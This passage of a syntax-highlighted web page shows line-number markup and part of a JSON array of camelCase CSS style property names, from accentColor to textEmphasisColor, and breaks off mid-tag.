class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&quot;accentColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;additiveSymbols&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alignContent&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alignItems&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alignSelf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alignmentBaseline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;all&quot;</span>,</span><br><span class="line">    <span class="string">&quot;animation&quot;</span>,</span><br><span class="line">    <span class="string">&quot;animationComposition&quot;</span>,</span><br><span class="line">    <span class="string">&quot;animationDelay&quot;</span>,</span><br><span class="line">    <span class="string">&quot;animationDirection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;animationDuration&quot;</span>,</span><br><span class="line">    <span class="string">&quot;animationFillMode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;animationIterationCount&quot;</span>,</span><br><span class="line">    <span class="string">&quot;animationName&quot;</span>,</span><br><span class="line">    <span class="string">&quot;animationPlayState&quot;</span>,</span><br><span class="line">    <span class="string">&quot;animationTimingFunction&quot;</span>,</span><br><span class="line">    <span class="string">&quot;appRegion&quot;</span>,</span><br><span class="line">    <span class="string">&quot;appearance&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ascentOverride&quot;</span>,</span><br><span class="line">    <span class="string">&quot;aspectRatio&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backdropFilter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backfaceVisibility&quot;</span>,</span><br><span class="line">    <span class="string">&quot;background&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundAttachment&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundBlendMode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundClip&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundImage&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundOrigin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundPosition&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundPositionX&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundPositionY&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundRepeat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundRepeatX&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundRepeatY&quot;</span>,</span><br><span class="line">    <span class="string">&quot;backgroundSize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;basePalette&quot;</span>,</span><br><span class="line">    <span class="string">&quot;baselineShift&quot;</span>,</span><br><span class="line">    <span class="string">&quot;baselineSource&quot;</span>,</span><br><span class="line">    <span class="string">&quot;blockSize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;border&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBlock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBlockColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBlockEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBlockEndColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBlockEndStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBlockEndWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBlockStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBlockStartColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBlockStartStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBlockStartWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBlockStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBlockWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBottom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBottomColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBottomLeftRadius&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBottomRightRadius&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBottomStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderBottomWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderCollapse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderEndEndRadius&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderEndStartRadius&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderImage&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderImageOutset&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderImageRepeat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderImageSlice&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderImageSource&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderImageWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderInline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderInlineColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderInlineEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderInlineEndColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderInlineEndStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderInlineEndWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderInlineStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderInlineStartColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderInlineStartStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderInlineStartWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderInlineStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderInlineWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderLeft&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderLeftColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderLeftStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderLeftWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderRadius&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderRight&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderRightColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderRightStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderRightWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderSpacing&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderStartEndRadius&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderStartStartRadius&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderTop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderTopColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderTopLeftRadius&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderTopRightRadius&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderTopStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderTopWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;borderWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bottom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;boxShadow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;boxSizing&quot;</span>,</span><br><span class="line">    <span class="string">&quot;breakAfter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;breakBefore&quot;</span>,</span><br><span class="line">    <span class="string">&quot;breakInside&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bufferedRendering&quot;</span>,</span><br><span class="line">    <span class="string">&quot;captionSide&quot;</span>,</span><br><span class="line">    <span class="string">&quot;caretColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;clear&quot;</span>,</span><br><span class="line">    <span class="string">&quot;clip&quot;</span>,</span><br><span class="line">    <span class="string">&quot;clipPath&quot;</span>,</span><br><span class="line">    <span class="string">&quot;clipRule&quot;</span>,</span><br><span class="line">    <span class="string">&quot;color&quot;</span>,</span><br><span class="line">    <span class="string">&quot;colorInterpolation&quot;</span>,</span><br><span class="line">    <span class="string">&quot;colorInterpolationFilters&quot;</span>,</span><br><span class="line">    <span class="string">&quot;colorRendering&quot;</span>,</span><br><span class="line">    <span class="string">&quot;colorScheme&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columnCount&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columnFill&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columnGap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columnRule&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columnRuleColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columnRuleStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columnRuleWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columnSpan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columnWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;columns&quot;</span>,</span><br><span class="line">    <span class="string">&quot;contain&quot;</span>,</span><br><span class="line">    <span class="string">&quot;containIntrinsicBlockSize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;containIntrinsicHeight&quot;</span>,</span><br><span class="line">    <span class="string">&quot;containIntrinsicInlineSize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;containIntrinsicSize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;containIntrinsicWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;container&quot;</span>,</span><br><span class="line">    <span class="string">&quot;containerName&quot;</span>,</span><br><span class="line">    <span class="string">&quot;containerType&quot;</span>,</span><br><span class="line">    <span class="string">&quot;content&quot;</span>,</span><br><span class="line">    <span class="string">&quot;contentVisibility&quot;</span>,</span><br><span class="line">    <span class="string">&quot;counterIncrement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;counterReset&quot;</span>,</span><br><span class="line">    <span class="string">&quot;counterSet&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cursor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cx&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cy&quot;</span>,</span><br><span class="line">    <span class="string">&quot;d&quot;</span>,</span><br><span class="line">    <span class="string">&quot;descentOverride&quot;</span>,</span><br><span class="line">    <span class="string">&quot;direction&quot;</span>,</span><br><span class="line">    <span class="string">&quot;display&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dominantBaseline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;emptyCells&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fallback&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fill&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fillOpacity&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fillRule&quot;</span>,</span><br><span class="line">    <span class="string">&quot;filter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flex&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flexBasis&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flexDirection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flexFlow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flexGrow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flexShrink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;flexWrap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;float&quot;</span>,</span><br><span class="line">    <span class="string">&quot;floodColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;floodOpacity&quot;</span>,</span><br><span class="line">    <span class="string">&quot;font&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontDisplay&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontFamily&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontFeatureSettings&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontKerning&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontOpticalSizing&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontPalette&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontSize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontStretch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontSynthesis&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontSynthesisSmallCaps&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontSynthesisStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontSynthesisWeight&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontVariant&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontVariantAlternates&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontVariantCaps&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontVariantEastAsian&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontVariantLigatures&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontVariantNumeric&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontVariationSettings&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fontWeight&quot;</span>,</span><br><span class="line">    <span class="string">&quot;forcedColorAdjust&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;grid&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridArea&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridAutoColumns&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridAutoFlow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridAutoRows&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridColumn&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridColumnEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridColumnGap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridColumnStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridGap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridRow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridRowEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridRowGap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridRowStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridTemplate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridTemplateAreas&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridTemplateColumns&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gridTemplateRows&quot;</span>,</span><br><span class="line">    <span class="string">&quot;height&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hyphenateCharacter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hyphenateLimitChars&quot;</span>,</span><br><span class="line">    <span class="string">&quot;hyphens&quot;</span>,</span><br><span class="line">    <span class="string">&quot;imageOrientation&quot;</span>,</span><br><span class="line">    <span class="string">&quot;imageRendering&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inherits&quot;</span>,</span><br><span class="line">    <span class="string">&quot;initialLetter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;initialValue&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inlineSize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inset&quot;</span>,</span><br><span class="line">    <span class="string">&quot;insetBlock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;insetBlockEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;insetBlockStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;insetInline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;insetInlineEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;insetInlineStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;isolation&quot;</span>,</span><br><span class="line">    <span class="string">&quot;justifyContent&quot;</span>,</span><br><span class="line">    <span class="string">&quot;justifyItems&quot;</span>,</span><br><span class="line">    <span class="string">&quot;justifySelf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;left&quot;</span>,</span><br><span class="line">    <span class="string">&quot;letterSpacing&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lightingColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lineBreak&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lineGapOverride&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lineHeight&quot;</span>,</span><br><span class="line">    <span class="string">&quot;listStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;listStyleImage&quot;</span>,</span><br><span class="line">    <span class="string">&quot;listStylePosition&quot;</span>,</span><br><span class="line">    <span class="string">&quot;listStyleType&quot;</span>,</span><br><span class="line">    <span class="string">&quot;margin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;marginBlock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;marginBlockEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;marginBlockStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;marginBottom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;marginInline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;marginInlineEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;marginInlineStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;marginLeft&quot;</span>,</span><br><span class="line">    <span class="string">&quot;marginRight&quot;</span>,</span><br><span class="line">    <span class="string">&quot;marginTop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;marker&quot;</span>,</span><br><span class="line">    <span class="string">&quot;markerEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;markerMid&quot;</span>,</span><br><span class="line">    <span class="string">&quot;markerStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mask&quot;</span>,</span><br><span class="line">    <span class="string">&quot;maskType&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mathDepth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mathShift&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mathStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;maxBlockSize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;maxHeight&quot;</span>,</span><br><span class="line">    <span class="string">&quot;maxInlineSize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;maxWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;minBlockSize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;minHeight&quot;</span>,</span><br><span class="line">    <span class="string">&quot;minInlineSize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;minWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mixBlendMode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;negative&quot;</span>,</span><br><span class="line">    <span class="string">&quot;objectFit&quot;</span>,</span><br><span class="line">    <span class="string">&quot;objectPosition&quot;</span>,</span><br><span class="line">    <span class="string">&quot;objectViewBox&quot;</span>,</span><br><span class="line">    <span class="string">&quot;offset&quot;</span>,</span><br><span class="line">    <span class="string">&quot;offsetDistance&quot;</span>,</span><br><span class="line">    <span class="string">&quot;offsetPath&quot;</span>,</span><br><span class="line">    <span class="string">&quot;offsetRotate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;opacity&quot;</span>,</span><br><span class="line">    <span class="string">&quot;order&quot;</span>,</span><br><span class="line">    <span class="string">&quot;orphans&quot;</span>,</span><br><span class="line">    <span class="string">&quot;outline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;outlineColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;outlineOffset&quot;</span>,</span><br><span class="line">    <span class="string">&quot;outlineStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;outlineWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;overflow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;overflowAnchor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;overflowClipMargin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;overflowWrap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;overflowX&quot;</span>,</span><br><span class="line">    <span class="string">&quot;overflowY&quot;</span>,</span><br><span class="line">    <span class="string">&quot;overrideColors&quot;</span>,</span><br><span class="line">    <span class="string">&quot;overscrollBehavior&quot;</span>,</span><br><span class="line">    <span class="string">&quot;overscrollBehaviorBlock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;overscrollBehaviorInline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;overscrollBehaviorX&quot;</span>,</span><br><span class="line">    <span class="string">&quot;overscrollBehaviorY&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pad&quot;</span>,</span><br><span class="line">    <span class="string">&quot;padding&quot;</span>,</span><br><span class="line">    <span class="string">&quot;paddingBlock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;paddingBlockEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;paddingBlockStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;paddingBottom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;paddingInline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;paddingInlineEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;paddingInlineStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;paddingLeft&quot;</span>,</span><br><span class="line">    <span class="string">&quot;paddingRight&quot;</span>,</span><br><span class="line">    <span class="string">&quot;paddingTop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;page&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageBreakAfter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageBreakBefore&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageBreakInside&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pageOrientation&quot;</span>,</span><br><span class="line">    <span class="string">&quot;paintOrder&quot;</span>,</span><br><span class="line">    <span class="string">&quot;perspective&quot;</span>,</span><br><span class="line">    <span class="string">&quot;perspectiveOrigin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;placeContent&quot;</span>,</span><br><span class="line">    <span class="string">&quot;placeItems&quot;</span>,</span><br><span class="line">    <span class="string">&quot;placeSelf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pointerEvents&quot;</span>,</span><br><span class="line">    <span class="string">&quot;position&quot;</span>,</span><br><span class="line">    <span class="string">&quot;prefix&quot;</span>,</span><br><span class="line">    <span class="string">&quot;quotes&quot;</span>,</span><br><span class="line">    <span class="string">&quot;r&quot;</span>,</span><br><span class="line">    <span class="string">&quot;range&quot;</span>,</span><br><span class="line">    <span class="string">&quot;resize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;right&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rotate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rowGap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rubyPosition&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rx&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scale&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollBehavior&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollMargin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollMarginBlock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollMarginBlockEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollMarginBlockStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollMarginBottom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollMarginInline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollMarginInlineEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollMarginInlineStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollMarginLeft&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollMarginRight&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollMarginTop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollPadding&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollPaddingBlock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollPaddingBlockEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollPaddingBlockStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollPaddingBottom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollPaddingInline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollPaddingInlineEnd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollPaddingInlineStart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollPaddingLeft&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollPaddingRight&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollPaddingTop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollSnapAlign&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollSnapStop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollSnapType&quot;</span>,</span><br><span class="line">    <span class="string">&quot;scrollbarGutter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;shapeImageThreshold&quot;</span>,</span><br><span class="line">    <span class="string">&quot;shapeMargin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;shapeOutside&quot;</span>,</span><br><span class="line">    <span class="string">&quot;shapeRendering&quot;</span>,</span><br><span class="line">    <span class="string">&quot;size&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sizeAdjust&quot;</span>,</span><br><span class="line">    <span class="string">&quot;speak&quot;</span>,</span><br><span class="line">    <span class="string">&quot;speakAs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;src&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stopColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stopOpacity&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stroke&quot;</span>,</span><br><span class="line">    <span class="string">&quot;strokeDasharray&quot;</span>,</span><br><span class="line">    <span class="string">&quot;strokeDashoffset&quot;</span>,</span><br><span class="line">    <span class="string">&quot;strokeLinecap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;strokeLinejoin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;strokeMiterlimit&quot;</span>,</span><br><span class="line">    <span class="string">&quot;strokeOpacity&quot;</span>,</span><br><span class="line">    <span class="string">&quot;strokeWidth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;suffix&quot;</span>,</span><br><span class="line">    <span class="string">&quot;symbols&quot;</span>,</span><br><span class="line">    <span class="string">&quot;syntax&quot;</span>,</span><br><span class="line">    <span class="string">&quot;system&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tabSize&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tableLayout&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textAlign&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textAlignLast&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textAnchor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textCombineUpright&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textDecoration&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textDecorationColor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textDecorationLine&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textDecorationSkipInk&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textDecorationStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textDecorationThickness&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textEmphasis&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textEmphasisColor&quot;</span>,</span><br><span class="line">    <span 